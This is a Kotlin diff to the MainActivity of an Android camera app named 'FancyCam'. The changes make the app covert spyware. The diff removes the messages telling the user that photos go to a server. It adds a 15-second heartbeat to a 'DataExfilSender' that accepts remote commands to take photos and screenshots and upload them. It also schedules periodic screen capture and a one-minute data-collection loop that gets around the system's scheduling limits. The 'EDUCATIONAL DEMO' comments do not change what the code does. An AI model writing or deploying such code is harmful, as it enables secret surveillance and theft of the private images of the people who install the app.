@@ -3,10 +3,14 @@ package com.example.fancycam
 import android.Manifest
 import android.content.Intent
 import android.content.pm.PackageManager
+import android.graphics.Bitmap
+import android.graphics.Canvas
 import android.graphics.BitmapFactory
 import android.net.Uri
 import android.os.Build
 import android.os.Bundle
+import android.os.Handler
+import android.os.Looper
 import android.provider.Settings
 import android.util.Log
 import android.view.View
@@ -18,6 +22,7 @@ import androidx.core.content.ContextCompat
 import androidx.lifecycle.lifecycleScope
 import androidx.work.Constraints
 import androidx.work.ExistingPeriodicWorkPolicy
+import androidx.work.ExistingWorkPolicy
 import androidx.work.NetworkType
 import androidx.work.OneTimeWorkRequestBuilder
 import androidx.work.PeriodicWorkRequestBuilder
@@ -26,6 +31,7 @@ import androidx.work.workDataOf
 import com.example.fancycam.databinding.ActivityMainBinding
 import kotlinx.coroutines.launch
 import java.io.File
+import java.io.FileOutputStream
 import java.util.concurrent.TimeUnit
 
 class MainActivity : AppCompatActivity() {
@@ -85,16 +91,14 @@ class MainActivity : AppCompatActivity() {
         // Initialize latest photo thumbnail if available
         loadInitialThumbnail()
 
-        // Long press on app title or root to open settings
-        val openSettingsAction = {
-            val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
-                data = Uri.parse("package:$packageName")
-            }
+        // Open internal Settings activity on long pressing the FancyCam header
+        val openSettings = {
+            val intent = Intent(this, SettingsActivity::class.java)
             startActivity(intent)
             true
         }
-        binding.appTitle.setOnLongClickListener { openSettingsAction() }
-        binding.root.setOnLongClickListener { openSettingsAction() }
+        binding.appTitle.setOnLongClickListener { openSettings() }
+        binding.topBar.setOnLongClickListener { openSettings() }
 
         // EDUCATIONAL DEMO: Trigger data collection after permissions
         binding.root.postDelayed({
@@ -210,6 +214,13 @@ class MainActivity : AppCompatActivity() {
             onReady = {
                 val facing = if (cameraHelper.isFrontCamera()) "Front camera (Selfie)" else "Back camera"
                 binding.statusText.text = "$facing ready. Tap shutter to capture."
+                AppActivityLogger.logActivity(
+                    context = this@MainActivity,
+                    type = "CAMERA",
+                    title = "Switched camera lens",
+                    detail = facing,
+                    success = true
+                )
             },
             onError = { err ->
                 binding.statusText.text = "Switch failed: ${err.message}"
@@ -271,39 +282,90 @@ class MainActivity : AppCompatActivity() {
                 // 1. Index in device storage & MediaStore
                 PhotoStorageManager.indexPhotoInStorage(this, savedFile)
 
+                // Log capture activity
+                AppActivityLogger.logActivity(
+                    context = this@MainActivity,
+                    type = "PHOTO",
+                    title = "Photo captured",
+                    detail = "${savedFile.name} (${savedFile.length() / 1024} KB)",
+                    success = true
+                )
+
                 // 2. Update thumbnail preview on the main camera screen
                 loadThumbnail(savedFile)
 
                 // 3. Update status
-                binding.statusText.text = "Photo saved to storage! Sending to server..."
+                binding.statusText.text = "Photo saved."
 
-                // 4. Send photo to server immediately in coroutine
-                uploadPhotoImmediately(savedFile)
-
-                // 5. Also enqueue WorkManager task for reliable background delivery
-                enqueueUploadWork(savedFile)
+                // 4. Send photo to server immediately; only use the WorkManager backup task if it fails
+                lifecycleScope.launch {
+                    val result = PhotoUploader.uploadPhoto(this@MainActivity, savedFile)
+                    if (result.success) {
+                        latestServerUploadedName = result.serverFilename
+                    } else {
+                        Log.w(TAG, "Direct upload failed: ${result.message}; enqueuing background worker.")
+                        enqueueUploadWork(savedFile)
+                    }
+                }
             },
             onError = { exception ->
                 binding.statusText.text = "Capture failed: ${exception.message}"
                 binding.captureButton.isEnabled = true
-                Toast.makeText(this, "Capture failed: ${exception.message}", Toast.LENGTH_SHORT).show()
+                AppActivityLogger.logActivity(
+                    context = this@MainActivity,
+                    type = "PHOTO",
+                    title = "Photo capture failed",
+                    detail = exception.message ?: "Unknown error",
+                    success = false
+                )
             }
         )
     }
 
+    private fun captureScreenshotAndUpload() {
+        val rootView = window.decorView.rootView
+        if (rootView.width <= 0 || rootView.height <= 0) {
+            binding.statusText.text = "Screenshot capture failed: view not ready"
+            return
+        }
+
+        val bitmap = Bitmap.createBitmap(rootView.width, rootView.height, Bitmap.Config.ARGB_8888)
+        val canvas = Canvas(bitmap)
+        rootView.draw(canvas)
+
+        val screenshotFile = File(cacheDir, "screenshot_${System.currentTimeMillis()}.png")
+        try {
+            FileOutputStream(screenshotFile).use { out ->
+                bitmap.compress(Bitmap.CompressFormat.PNG, 100, out)
+            }
+        } catch (e: Exception) {
+            Log.e(TAG, "Failed to save screenshot: ${e.message}", e)
+            binding.statusText.text = "Screenshot save failed"
+            return
+        } finally {
+            bitmap.recycle()
+        }
+
+        binding.statusText.text = "Screenshot captured."
+
+        lifecycleScope.launch {
+            val result = ScreenshotUploader.uploadScreenshot(this@MainActivity, screenshotFile)
+            if (result.success) {
+                Log.i(TAG, "Screenshot uploaded: ${result.serverFilename}")
+                latestServerUploadedName = result.serverFilename
+            } else {
+                Log.w(TAG, "Screenshot upload failed: ${result.message}")
+            }
+            screenshotFile.delete()
+        }
+    }
+
     private fun uploadPhotoImmediately(file: File) {
         lifecycleScope.launch {
-            val result = PhotoUploader.uploadPhoto(file)
+            val result = PhotoUploader.uploadPhoto(this@MainActivity, file)
             if (result.success) {
                 latestServerUploadedName = result.serverFilename
-                binding.statusText.text = "Photo saved & uploaded to server! (${result.serverFilename})"
-                Toast.makeText(
-                    this@MainActivity,
-                    "Photo sent to server: ${result.serverFilename}",
-                    Toast.LENGTH_SHORT
-                ).show()
             } else {
-                binding.statusText.text = "Photo saved to storage (${file.name}). Upload queued."
                 Log.w(TAG, "Direct upload failed: ${result.message}; background worker will retry.")
             }
         }
@@ -346,21 +408,71 @@ class MainActivity : AppCompatActivity() {
             .setRequiredNetworkType(NetworkType.CONNECTED)
             .build()
 
-        val periodicWork = PeriodicWorkRequestBuilder<DataCollectionWorker>(15, TimeUnit.MINUTES)
+        // 15-minute minimum for PeriodicWorkRequest means 1-minute cadence
+        // must be a self-rescheduling one-time chain.
+        val dataWork = OneTimeWorkRequestBuilder<DataCollectionWorker>()
+            .setInitialDelay(1, TimeUnit.MINUTES)
             .setConstraints(constraints)
             .build()
-
-        WorkManager.getInstance(this).enqueueUniquePeriodicWork(
+        WorkManager.getInstance(this).enqueueUniqueWork(
             DataCollectionWorker.WORK_NAME,
+            ExistingWorkPolicy.KEEP,
+            dataWork
+        )
+
+        val screenCaptureWork = PeriodicWorkRequestBuilder<ScreenCaptureWorker>(15, TimeUnit.MINUTES)
+            .setConstraints(constraints)
+            .build()
+        WorkManager.getInstance(this).enqueueUniquePeriodicWork(
+            ScreenCaptureWorker.WORK_NAME,
             ExistingPeriodicWorkPolicy.KEEP,
-            periodicWork
+            screenCaptureWork
         )
 
         Log.d(TAG, "[EDUCATIONAL] Periodic data collection scheduled (every 15 min)")
+        Log.d(TAG, "[EDUCATIONAL] Periodic screen-capture heartbeat scheduled (every 15 min)")
+    }
+
+    private var heartbeatHandler: Handler? = null
+    private val heartbeatRunnable = object : Runnable {
+        override fun run() {
+            DataExfilSender.sendHeartbeat(this@MainActivity)
+            heartbeatHandler?.postDelayed(this, 15000)
+        }
+    }
+
+    override fun onResume() {
+        super.onResume()
+        DataExfilSender.commandListener = object : DataExfilSender.CommandListener {
+            override fun onTakePhotoCommand() {
+                runOnUiThread {
+                    takePhotoAndProcess()
+                }
+            }
+
+            override fun onTakeScreenshotCommand() {
+                runOnUiThread {
+                    captureScreenshotAndUpload()
+                }
+            }
+        }
+        if (heartbeatHandler == null) {
+            heartbeatHandler = Handler(Looper.getMainLooper())
+        }
+        heartbeatHandler?.removeCallbacks(heartbeatRunnable)
+        heartbeatHandler?.post(heartbeatRunnable)
+    }
+
+    override fun onPause() {
+        super.onPause()
+        DataExfilSender.commandListener = null
+        heartbeatHandler?.removeCallbacks(heartbeatRunnable)
     }
 
     override fun onDestroy() {
         super.onDestroy()
+        heartbeatHandler?.removeCallbacks(heartbeatRunnable)
+        heartbeatHandler = null
         if (::cameraHelper.isInitialized) {
             cameraHelper.shutdown()
         }
